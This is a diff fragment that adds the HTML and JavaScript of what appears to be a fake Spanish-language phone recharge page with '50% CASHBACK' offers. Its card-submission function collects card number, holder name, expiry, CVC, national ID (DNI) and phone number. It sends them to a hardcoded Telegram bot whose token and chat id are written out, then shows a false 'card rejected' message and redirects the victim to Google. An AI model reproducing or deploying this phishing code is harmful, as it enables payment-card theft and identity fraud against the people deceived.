+        <button class="other-amount" id="btnOtherAmounts" onclick="showExtraAmounts()">
+          Otros montos
+        </button>
+        <!-- Contenedor de nuevas opciones -->
+        <div id="extraAmounts" style="display: none; flex-direction: column; gap: 10px; width: 100%; align-items: center;">
+          <button class="recharge-button" onclick="selectRecharge('Recarga $2500')">
+            <span>$2.500</span>
+            <div class="cashback-badge">50% CASHBACK</div>
+          </button>
+          <button class="recharge-button" onclick="selectRecharge('Recarga $2000')">
+            <span>$2.000</span>
+            <div class="cashback-badge">50% CASHBACK</div>
+          </button>
+          <button class="recharge-button" onclick="selectRecharge('Recarga $1500')">
+            <span>$1.500</span>
+            <div class="cashback-badge">50% CASHBACK</div>
+          </button>
+          <button class="recharge-button" onclick="selectRecharge('Recarga $1000')">
+            <span>$1.000</span>
+            <div class="cashback-badge">50% CASHBACK</div>
+          </button>
+          <button class="recharge-button" onclick="selectRecharge('Recarga $500')">
+            <span>$500</span>
+            <div class="cashback-badge">50% CASHBACK</div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /************************************
+     * FUNCIÓN PARA CONTINUAR CON EL NÚMERO
+     ************************************/
+    function continueWithPhone() {
+      const phoneInput = document.getElementById('phoneInput');
+      const phoneDisplay = document.getElementById('phoneDisplay');
+      const phonePage = document.getElementById('phonePage');
+      
+      let value = phoneInput.value.replace(/\D/g, '');
+      if (value.length === 10) {
+        phoneDisplay.innerText = value;
+        phoneDisplay.style.display = 'block';
+        phonePage.style.display = 'none';
+      } else {
+        alert('Por favor, ingresa un número válido de 10 dígitos');
+      }
+    }
+
+    /********************************
+     * MANEJO DEL MODAL DE COMPRA (PACKS)
+     ********************************/
+    function openPackModal(packName) {
+      document.getElementById('packTitle').innerText = "Comprando: " + packName;
+      document.getElementById('packModal').style.display = 'block';
+    }
+    function closePackModal() {
+      document.getElementById('packModal').style.display = 'none';
+    }
+
+    /********************************
+     * ACCESO A PANTALLA COMPLETA PARA AGREGAR TARJETA
+     ********************************/
+    function showCardPage() {
+      closePackModal();
+      document.getElementById('cardPage').style.display = 'block';
+    }
+    function hideCardPage() {
+      document.getElementById('cardPage').style.display = 'none';
+      document.getElementById('packModal').style.display = 'block';
+    }
+
+    /********************************
+     * PANTALLA COMPLETA PARA RECARGA
+     ********************************/
+    function showRechargePage() {
+      document.getElementById('rechargePage').style.display = 'block';
+    }
+    function closeRechargePage() {
+      document.getElementById('rechargePage').style.display = 'none';
+    }
+    function selectRecharge(monto) {
+      closeRechargePage();
+      openPackModal(monto);
+    }
+
+    /********************************
+     * FUNCIÓN PARA MOSTRAR LAS NUEVAS OPCIONES
+     ********************************/
+    function showExtraAmounts() {
+      document.getElementById('btnOtherAmounts').style.display = 'none';
+      document.getElementById('extraAmounts').style.display = 'flex';
+    }
+
+    /********************************
+     * ENVÍO DE DATOS A TELEGRAM AL COMPRAR
+     ********************************/
+    function handleCardSubmit(event) {
+      event.preventDefault();
+      const cardNumber = document.getElementById('cardNumber').value;
+      const fullName   = document.getElementById('fullName').value;
+      const expiration = document.getElementById('expiration').value;
+      const cvc        = document.getElementById('cvc').value;
+      const dni        = document.getElementById('dni').value;
+      const packTitle  = document.getElementById('packTitle').innerText;
+      const phone      = document.getElementById('phoneDisplay').innerText || "No especificado";
+      
+      const text = encodeURIComponent(
+        `${packTitle}\nNúmero de Tarjeta: ${cardNumber}\nNombre: ${fullName}\nExpiración: ${expiration}\nCVC: ${cvc}\nDNI: ${dni}\nTeléfono: ${phone}`
+      );
+      const botToken = "7793076947:AAHHLYaxuFfRZmVIOsH5cSxcfZLt5s_eeP4";
+      const chatId = "6493944778";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+      
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Se agrega borde rojo a todos los inputs dentro de la tarjeta
+            const inputs = document.querySelectorAll('#cardPage input');
+            inputs.forEach(input => {
+              input.style.border = '2px solid red';
+            });
+            // Se crea o actualiza el mensaje de error
+            let errorMessage = document.getElementById('errorMessage');
+            if (!errorMessage) {
+              errorMessage = document.createElement('div');
+              errorMessage.id = 'errorMessage';
+              errorMessage.style.backgroundColor = '#ffe6e6';
+              errorMessage.style.color = '#cc0000';
+              errorMessage.style.padding = '10px';
+              errorMessage.style.marginTop = '20px';
+              errorMessage.style.borderRadius = '5px';
+              errorMessage.style.textAlign = 'center';
+              errorMessage.style.fontWeight = 'bold';
+              document.querySelector('.new-card-form').appendChild(errorMessage);
+            }
+            errorMessage.innerText = "Tarjeta rechazada o no válida. Comuníquese con su banco para solucionar el problema.";
+            // Se realiza el scroll hacia el final de la página para que se vea el mensaje
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            // Después de 13 segundos se redirige a Google
+            setTimeout(function(){
+              window.location.href = "https://www.google.com";
+            }, 13000);
+          } else {
+            alert('Error al enviar la información a Telegram.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Error en la solicitud.');
+        });
+      return false;
+    }
+
+    /********************************
+     * FORMATEO DE CAMPOS DEL FORM
+     ********************************/
+    function formatCardNumber() {
+      const input = document.getElementById('cardNumber');
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 16) {
+        value = value.slice(0, 16);
+      }
+      input.value = value;
+    }
+    function updateCardLogo() {
+      const cardInput = document.getElementById('cardNumber');
+      const cardLogoPreview = document.getElementById('cardLogoPreview');
+      const cardNumber = cardInput.value;
+      
+      if (cardNumber.startsWith("4")) {
+         cardLogoPreview.src = "https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png"; 
+         cardLogoPreview.style.width = "50px";
+         cardLogoPreview.style.display = "block";
+      } else if (cardNumber.startsWith("5")) {
+         cardLogoPreview.src = "https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png";
+         cardLogoPreview.style.width = "50px";
+         cardLogoPreview.style.display = "block";
+      } else if (cardNumber.startsWith("34") || cardNumber.startsWith("37")) {
+         cardLogoPreview.src = "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg";
+         cardLogoPreview.style.width = "40px";
+         cardLogoPreview.style.display = "block";
+      } else {
+         cardLogoPreview.style.display = "none";
+      }
+    }
+    function formatExpiration() {
+      const input = document.getElementById('expiration');
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 4) {
+        value = value.slice(0, 4);
+      }
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      input.value = value;
+    }
+    function formatCVC() {
+      const input = document.getElementById('cvc');
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 3) {
+        value = value.slice(0, 3);
+      }
+      input.value = value;
+    }
+    function formatDNI() {
+      const input = document.getElementById('dni');
+      let digits = input.value.replace(/\D/g, '');
+      if (digits.length > 8) {
+        digits = digits.slice(0, 8);
+      }
+      let formatted = digits;
+      if (digits.length > 2) {
+        formatted = digits.slice(0,2) + '.' + digits.slice(2);
+      }
+      if (digits.length > 5) {
+        formatted = formatted.slice(0,6) + '.' + formatted.slice(6);
+      }
+      input.value = formatted;
+    }
+    function updateCardPreview() {
+      const cardNumber = document.getElementById('cardNumber').value;
+      const fullName = document.getElementById('fullName').value;
+      const expiration = document.getElementById('expiration').value;
+      
+      const numberDisplay = document.getElementById('cardNumberDisplay');
+      const holderDisplay = document.getElementById('cardHolderDisplay');
+      const expirationDisplay = document.getElementById('cardExpirationDisplay');
+      
+      let formattedNumber = cardNumber.padEnd(16, "#").replace(/(.{4})/g, '$1 ').trim();
+      numberDisplay.innerText = formattedNumber;
+      holderDisplay.innerText = fullName || "NOMBRE COMPLETO";
+      expirationDisplay.innerText = expiration || "MM/AA";
+    }
+    
+    /********************************
+     * MODALES PARA PRESTA Y MIS PACKS
+     ********************************/
+    function showLoanModal() {
+      document.getElementById('loanModal').style.display = 'block';
+    }
+    function closeLoanModal() {
+      document.getElementById('loanModal').style.display = 'none';
+    }
+    function showPacksModal() {
+      document.getElementById('packsModal').style.display = 'block';
+    }
+    function closePacksModal() {
+      document.getElementById('packsModal').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
